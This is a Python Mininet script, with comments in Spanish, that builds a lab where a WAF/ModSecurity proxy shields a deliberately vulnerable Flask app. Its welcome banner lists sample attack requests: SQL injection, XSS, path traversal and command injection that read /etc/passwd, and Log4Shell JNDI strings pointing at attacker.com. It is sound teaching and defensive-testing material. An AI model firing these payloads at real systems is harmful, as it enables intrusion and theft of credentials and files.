#!/usr/bin/python
"""
Escenario WAF + ModSecurity en Mininet
Aplicacion Flask protegida por un proxy inverso WAF (ModSecurity + Nginx simulado)

Topologia:
    [cliente 10.0.2.10]   [atacante 10.0.2.20]
              \                  /
               \                /
                [---- s1 -------]
                        |
             [waf 10.0.2.80]         <- Nginx + ModSecurity (:80)
                        |
             [webserver 10.0.2.90]   <- Flask app (:5000)
                        |
             [monitor 10.0.2.100]    <- Analizador de logs WAF
"""

import os
import sys
import time
from mininet.net import Mininet
from mininet.node import OVSKernelSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink


def crearTopologiaWAF():
    """
    Crea la topologia del escenario WAF + ModSecurity.

    Topologia ASCII:
        [cliente 10.0.2.10]   [atacante 10.0.2.20]
                  \\                  /
                   \\                /
                    [---- s1 -------]
                            |
                 [waf 10.0.2.80]     (Nginx+ModSecurity - puerto 80)
                            |
                 [webserver 10.0.2.90] (Flask - puerto 5000)
                            |
                 [monitor  10.0.2.100] (Analisis de logs)
    """

    info('*** Limpiando configuracion previa\n')
    os.system('sudo mn -c > /dev/null 2>&1')
    os.system('pkill -f waf_proxy.py 2>/dev/null')
    os.system('pkill -f flask_app.py 2>/dev/null')
    os.system('pkill -f waf_monitor.py 2>/dev/null')

    net = Mininet(switch=OVSKernelSwitch, link=TCLink, autoSetMacs=True)

    info('*** Creando hosts\n')
    cliente   = net.addHost('cliente',   ip='10.0.2.10/24',  mac='00:00:00:00:00:0a')
    atacante  = net.addHost('atacante',  ip='10.0.2.20/24',  mac='00:00:00:00:00:14')
    waf       = net.addHost('waf',       ip='10.0.2.80/24',  mac='00:00:00:00:00:50')
    webserver = net.addHost('webserver', ip='10.0.2.90/24',  mac='00:00:00:00:00:5a')
    monitor   = net.addHost('monitor',   ip='10.0.2.100/24', mac='00:00:00:00:00:64')

    info('*** Creando switch\n')
    s1 = net.addSwitch('s1')

    info('*** Creando enlaces\n')
    net.addLink(cliente,   s1)
    net.addLink(atacante,  s1)
    net.addLink(waf,       s1)
    net.addLink(webserver, s1)
    net.addLink(monitor,   s1)

    info('*** Iniciando red\n')
    net.start()
    time.sleep(2)

    info('*** Configurando flujos del switch\n')
    os.system('ovs-ofctl add-flow s1 priority=1,action=flood')

    info('*** Configurando escenario WAF\n')
    configurarEscenario(net, cliente, atacante, waf, webserver, monitor)

    imprimirMensajeBienvenida()
    CLI(net)

    info('*** Deteniendo servicios\n')
    waf.cmd('pkill -f waf_proxy.py 2>/dev/null')
    webserver.cmd('pkill -f flask_app.py 2>/dev/null')
    monitor.cmd('pkill -f waf_monitor.py 2>/dev/null')

    info('*** Deteniendo red\n')
    net.stop()


def configurarEscenario(net, cliente, atacante, waf, webserver, monitor):
    """Inicia los servicios del escenario WAF."""

    SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))

    info('*** Copiando scripts a /tmp/\n')
    for script in ['flask_app.py', 'waf_proxy.py', 'waf_monitor.py', 'web_attacker.py']:
        src = os.path.join(SCRIPT_DIR, script)
        if os.path.exists(src):
            os.system(f'cp {src} /tmp/')
            os.system(f'chmod +x /tmp/{script}')
            info(f'  [OK] {script} -> /tmp/\n')

    info('*** Iniciando aplicacion Flask en webserver (10.0.2.90:5000)\n')
    webserver.cmd('python3 /tmp/flask_app.py > /tmp/flask_app.log 2>&1 &')
    time.sleep(3)

    info('*** Iniciando proxy WAF en waf (10.0.2.80:80)\n')
    waf.cmd('python3 /tmp/waf_proxy.py --backend 10.0.2.90 --backend-port 5000 --port 80 '
            '> /tmp/waf_proxy.log 2>&1 &')
    time.sleep(2)

    info('*** Iniciando monitor de logs en monitor (10.0.2.100)\n')
    monitor.cmd('python3 /tmp/waf_monitor.py > /tmp/waf_monitor_stdout.log 2>&1 &')
    time.sleep(1)

    info('*** Configurando mirror de trafico hacia monitor\n')
    try:
        os.system(
            'ovs-vsctl -- set Bridge s1 mirrors=@m '
            '-- --id=@wafport get Port waf-eth0 '
            '-- --id=@mon get Port monitor-eth0 '
            '-- --id=@m create Mirror name=waf_mirror select-all=true output-port=@mon '
            '> /dev/null 2>&1'
        )
        monitor.cmd('ifconfig monitor-eth0 promisc')
        info('  [OK] Mirror de trafico configurado\n')
    except Exception as e:
        info(f'  [WARN] Mirror no configurado: {e}\n')

    info('*** Escenario WAF iniciado correctamente\n')
    info('    Via WAF (protegido):    http://10.0.2.80/\n')
    info('    Backend directo:        http://10.0.2.90:5000/\n')


def imprimirMensajeBienvenida():
    print('\n' + '=' * 75)
    print('  >>> ESCENARIO WAF + MODSECURITY (Flask + Nginx + ModSecurity) <<<')
    print('=' * 75)
    print("""
[TOPOLOGIA]
  10.0.2.10   cliente    - Usuario legitimo navegando la aplicacion
  10.0.2.20   atacante   - Atacante web (SQLi, XSS, LFI, CMDi, Log4Shell...)
  10.0.2.80   waf        - Proxy inverso WAF (Nginx + ModSecurity, puerto :80)
  10.0.2.90   webserver  - Aplicacion Flask vulnerable (backend, puerto :5000)
  10.0.2.100  monitor    - Monitor de logs y estadisticas WAF

[FASE 1 - VERIFICAR CONECTIVIDAD]
  mininet> pingall
  mininet> cliente curl -s http://10.0.2.80/            # Via WAF (OK)
  mininet> cliente curl -s http://10.0.2.90:5000/       # Directo al backend

[FASE 2 - PETICIONES LEGITIMAS (deben ser PERMITIDAS por el WAF)]
  mininet> cliente curl "http://10.0.2.80/buscar?q=python+tutorial"
  mininet> cliente curl "http://10.0.2.80/archivo?f=manual.pdf"
  mininet> cliente curl -X POST http://10.0.2.80/login -d "user=admin&pass=admin123"

[FASE 3 - ATAQUES WEB VIA WAF (deben ser BLOQUEADOS - HTTP 403)]
  # SQL Injection
  mininet> atacante curl "http://10.0.2.80/login?user=admin'+OR+'1'='1&pass=x"
  mininet> atacante curl "http://10.0.2.80/buscar?q=UNION+SELECT+*+FROM+users--"

  # Cross-Site Scripting (XSS)
  mininet> atacante curl "http://10.0.2.80/buscar?q=<script>alert(1)</script>"
  mininet> atacante curl "http://10.0.2.80/buscar?q=<img+src=x+onerror=alert(1)>"

  # Path Traversal / LFI
  mininet> atacante curl "http://10.0.2.80/archivo?f=../../../etc/passwd"
  mininet> atacante curl "http://10.0.2.80/archivo?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

  # Command Injection
  mininet> atacante curl "http://10.0.2.80/ping?host=127.0.0.1;cat+/etc/passwd"
  mininet> atacante curl "http://10.0.2.80/ping?host=127.0.0.1|id"

  # Log4Shell (CVE-2021-44228)
  mininet> atacante curl --globoff "http://10.0.2.80/buscar?q=\${jndi:ldap://attacker.com/a}"
  mininet> atacante curl "http://10.0.2.80/buscar?q=jndi:ldap://attacker.com/exploit"

[FASE 4 - COMPARAR: CON WAF vs SIN WAF]
  # Los mismos ataques contra el backend SIN WAF (deben PASAR)
  mininet> atacante curl "http://10.0.2.90:5000/login?user=admin'+OR+'1'='1"
  mininet> atacante curl "http://10.0.2.90:5000/buscar?q=<script>alert(1)</script>"
  mininet> atacante curl "http://10.0.2.90:5000/archivo?f=../../../etc/passwd"

[FASE 5 - SCRIPT DE ATAQUE AUTOMATIZADO]
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --all
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --sqli
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --xss
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --traversal
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.80 --legit

  # Sin WAF (comparar)
  mininet> atacante python3 /tmp/web_attacker.py --target 10.0.2.90 --port 5000 --all

[FASE 6 - MONITOREO EN TIEMPO REAL]
  mininet> sh cat /tmp/waf_attack_log.txt       # Ataques bloqueados
  mininet> sh cat /tmp/waf_access_log.txt       # Accesos permitidos
  mininet> sh tail -f /tmp/waf_attack_log.txt   # Tiempo real

[ARCHIVOS GENERADOS]
  /tmp/flask_app.log       - Log de la aplicacion Flask (backend)
  /tmp/waf_proxy.log       - Log del proxy WAF (Nginx+ModSecurity)
  /tmp/waf_attack_log.txt  - Registro de ataques detectados y bloqueados
  /tmp/waf_access_log.txt  - Registro de accesos permitidos
  /tmp/waf_monitor.log     - Estadisticas del monitor

[NOTA IMPORTANTE]
  El WAF actua como PROXY INVERSO (reverse proxy):
    Internet --> [WAF :80] --> [Flask :5000]
  Las peticiones maliciosas son bloqueadas con HTTP 403 Forbidden
  Solo el trafico legitimo llega al backend Flask
  El backend en :5000 queda "oculto" detras del WAF
""")
    print('=' * 75)
    print('  Escenario listo. Usa "exit" para terminar.')
    print('=' * 75 + '\n')


if __name__ == '__main__':
    setLogLevel('info')
    crearTopologiaWAF()
